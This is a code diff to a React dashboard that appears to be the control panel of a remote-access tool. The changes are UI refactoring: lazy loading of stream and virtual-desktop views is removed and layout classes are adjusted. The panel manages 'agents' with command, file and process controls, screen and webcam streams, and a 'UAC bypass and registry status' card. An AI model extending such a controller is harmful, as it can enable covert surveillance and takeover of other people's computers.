@@ -1,9 +1,7 @@
 import { useState, useEffect, lazy, Suspense } from "react";
- import { useSocket } from "./components/SocketProvider";
+import { useSocket } from "./components/SocketProvider";
 import { AgentCard } from "./components/AgentCard";
-const StreamViewerLazy = lazy(() =>
-  import("./components/StreamViewer").then((mod) => ({ default: mod.StreamViewer }))
-);
+import { StreamViewer } from "./components/StreamViewer";
 import { CommandPanel } from "./components/CommandPanel";
 import { SystemMonitor } from "./components/SystemMonitor";
 import { FileManager } from "./components/FileManager";
@@ -27,9 +25,7 @@ import ToggleControlPanel from "./components/ToggleControlPanel";
  const ProcessManagerLazy = lazy(() =>
    import("./components/ProcessManager").then((mod) => ({ default: mod.ProcessManager }))
  );
- const VirtualDesktopLazy = lazy(() =>
-   import("./components/VirtualDesktop").then((mod) => ({ default: mod.VirtualDesktop }))
- );
+ import { VirtualDesktop } from "./components/VirtualDesktop";
 import { ThemeProvider } from "./components/ThemeProvider";
 import { ErrorBoundary } from "./components/ErrorBoundary";
 import { Login } from "./components/Login";
@@ -428,20 +424,20 @@ function AppContent() {
                         </div>
 
                         <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-stretch">
-                          <div className="h-[300px] sm:h-[420px]">
+                          <div className="min-h-[300px]">
                             <QuickActions
                             agentCount={onlineAgents.length}
                             selectedAgent={selectedAgent}
                             />
                           </div>
-                          <Card className="h-[300px] sm:h-[420px] flex flex-col">
+                          <Card className="min-h-[300px] flex flex-col">
                             <CardHeader>
                               <CardTitle>Security Overview</CardTitle>
                               <CardDescription>
                                 UAC bypass and registry status
                               </CardDescription>
                             </CardHeader>
-                            <CardContent className="flex-1 overflow-auto">
+                            <CardContent className="flex-1 overflow-visible">
                               {(() => {
                                 const aid = selectedAgent || (onlineAgents[0]?.id ?? null);
                                 const cfg = aid ? agentConfig?.[aid] : null;
@@ -642,26 +638,22 @@ function AppContent() {
                       })()}
                     </CardContent>
                   </Card>
-                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading stream viewer…</div>}>
-                    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-                      <StreamViewerLazy
-                        agentId={selectedAgent}
-                        type="screen"
-                        title="Screen Stream"
-                      />
-                      <StreamViewerLazy
-                        agentId={selectedAgent}
-                        type="camera"
-                        title="Camera Stream"
-                      />
-                    </div>
-                  </Suspense>
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+                    <StreamViewer
+                      agentId={selectedAgent}
+                      type="screen"
+                      title="Screen Stream"
+                    />
+                    <StreamViewer
+                      agentId={selectedAgent}
+                      type="camera"
+                      title="Camera Stream"
+                    />
+                  </div>
                 </TabsContent>
 
                 <TabsContent value="virtual" className="space-y-6">
-                  <Suspense fallback={<div className="text-sm text-muted-foreground p-4">Loading virtual desktop…</div>}>
-                    <VirtualDesktopLazy agentId={selectedAgent} />
-                  </Suspense>
+                  <VirtualDesktop agentId={selectedAgent} />
                 </TabsContent>
  
                 <TabsContent
